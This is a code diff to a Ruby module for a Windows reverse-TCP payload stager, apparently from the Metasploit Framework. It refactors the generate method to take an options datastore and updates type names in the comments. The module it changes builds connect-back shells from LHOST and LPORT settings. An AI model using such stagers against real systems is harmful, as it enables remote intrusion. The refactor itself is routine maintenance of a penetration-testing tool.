@@ -25,17 +25,18 @@ module Payload::Windows::ReverseTcp
   #
   # Generate the first stage
   #
-  def generate
+  def generate(opts={})
+    ds = opts[:datastore] || datastore
     conf = {
-      port:        datastore['LPORT'],
-      host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
+      port:        ds['LPORT'],
+      host:        ds['LHOST'],
+      retry_count: ds['ReverseConnectRetries'],
       reliable:    false
     }
 
     # Generate the advanced stager if we have space
     if self.available_space && required_space <= self.available_space
-      conf[:exitfunk] = datastore['EXITFUNC']
+      conf[:exitfunk] = ds['EXITFUNC']
       conf[:reliable] = true
     end
 
@@ -92,9 +93,9 @@ module Payload::Windows::ReverseTcp
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
-  # @option opts [Fixnum] :retry_count Number of retry attempts
+  # @option opts [Integer] :retry_count Number of retry attempts
   #
   def asm_reverse_tcp(opts={})
 
